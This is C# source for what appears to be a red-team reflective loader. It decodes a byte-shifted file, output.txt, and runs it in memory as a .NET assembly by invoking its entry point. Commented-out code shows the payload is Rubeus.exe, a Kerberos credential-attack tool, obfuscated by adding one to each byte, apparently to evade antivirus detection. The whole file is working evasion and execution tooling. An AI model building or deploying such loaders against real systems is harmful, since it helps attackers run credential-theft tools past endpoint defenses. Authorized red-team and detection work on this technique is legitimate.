using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
class Program
{
    static void Main()
    {
        //create_box();
        //byte[] assemblyBytes = FileToByteArray("C:\\Users\\seb\\GIT\\REDTEAM_PE_Reflective\\NETLOADER\\bin\\Release\\net8.0\\output.txt");
        //byte[] assemblyBytes = FileToByteArray("C:\\Users\\seb\\source\\repos\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe");
        byte[] assemblyBytes = FileToByteArray("output.txt");
        unboxing(assemblyBytes, assemblyBytes.Length);
        for (int i = 0; i < 10; ++i)
        {
            Console.WriteLine("Single byte: " + assemblyBytes[i]);
        }
        if (assemblyBytes != null)
        {
            try
            {
                Assembly assembly = Assembly.Load(assemblyBytes);
                MethodInfo entryPoint = assembly.EntryPoint;
                if (entryPoint != null)
                {
                    object[] parameters = entryPoint.GetParameters().Length > 0 ? new object[] { new string[] { } } : null;
                    entryPoint.Invoke(null, parameters);
                }
                else
                {
                    Console.WriteLine("Entry point not found in the loaded assembly.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to execute loaded assembly: " + ex.Message);
            }
        }
        else
        {
            Console.WriteLine("Failed to load assembly into memory.");
        }
    }
    static byte[] FileToByteArray(string filePath)
    {
        if (File.Exists(filePath))
        {
            return File.ReadAllBytes(filePath);
        }
        else
        {
            throw new FileNotFoundException("File not found", filePath);
        }
    }
    static byte mixme(byte car)
    {
        return (byte)(car + 1);
    }
    static byte unmixme(byte car)
    {
        return (byte)(car - 1);
    }
    static void boxing(byte[] buf, long size)
    {
        for (long i = 0; i < size; ++i)
        {
            buf[i] = mixme(buf[i]);
        }
    }
    static void unboxing(byte[] buf, long size)
    {
        for (long i = 0; i < size; ++i)
        {
            buf[i] = unmixme(buf[i]);
        }
    }
    /*static void create_box() {
	    long			size = 0;
	    byte[] boxed = FileToByteArray("C:\\Users\\seb\\source\\repos\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe");
        size = boxed.Length;

	    boxing(boxed, size);

        try
        {
            File.WriteAllBytes("C:\\Users\\seb\\GIT\\REDTEAM_PE_Reflective\\NETLOADER\\bin\\Release\\net8.0\\output.txt", boxed);
        }
        catch (Exception ex)
        {
            Console.WriteLine("An error occurred while writing the file: " + ex.Message);
        }
    }*/
}
